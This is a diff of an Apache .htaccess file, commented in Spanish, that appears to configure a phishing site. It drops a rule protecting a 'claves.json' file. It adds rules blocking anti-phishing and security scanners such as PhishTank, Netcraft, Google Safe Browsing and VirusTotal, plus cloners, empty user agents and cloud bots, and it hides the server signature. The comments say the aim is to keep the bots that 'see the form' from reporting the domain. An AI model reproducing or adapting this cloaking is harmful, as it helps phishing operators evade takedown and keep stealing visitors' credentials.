@@ -1,4 +1,23 @@
-<Files claves.json>
-    Order Allow,Deny
-    Deny from all
-</Files>
+RewriteEngine On
+
+# 1. Bloqueo de Clonadores y Herramientas de Descarga (Tu código optimizado)
+RewriteCond %{HTTP_USER_AGENT} (WebCopy|Cyotek|HTTrack|Wget|Python|Cloud-Scanner|clon|curl|libwww|Java|pycurl) [NC]
+RewriteRule .* - [F,L]
+
+# 2. Bloqueo de Bots de Seguridad y Escáneres (Los que suspenden tu dominio)
+# Estos bots son los que entran, ven el formulario y te denuncian el dominio.
+RewriteCond %{HTTP_USER_AGENT} (Netcraft|PhishTank|PhishLabs|Google-Safety|SafeBrowsing|VirusTotal|UrlScan|Avast|Kaspersky|McAfee) [NC]
+RewriteRule .* - [F,L]
+
+# 3. Bloqueo de peticiones sin User-Agent (Indispensable)
+RewriteCond %{HTTP_USER_AGENT} ^-?$
+RewriteRule ^ - [F,L]
+
+# 4. Bloqueo de IPs de Centros de Datos (Opcional pero recomendado)
+# Esto evita que bots de Amazon, DigitalOcean o Google Cloud revisen tu web.
+RewriteCond %{HTTP_USER_AGENT} (Amazonbot|Cloudflare-Labs|Compute|DigitalOcean) [NC]
+RewriteRule .* - [F,L]
+
+# 5. Ocultar la firma del servidor para no dar pistas
+ServerSignature Off
+
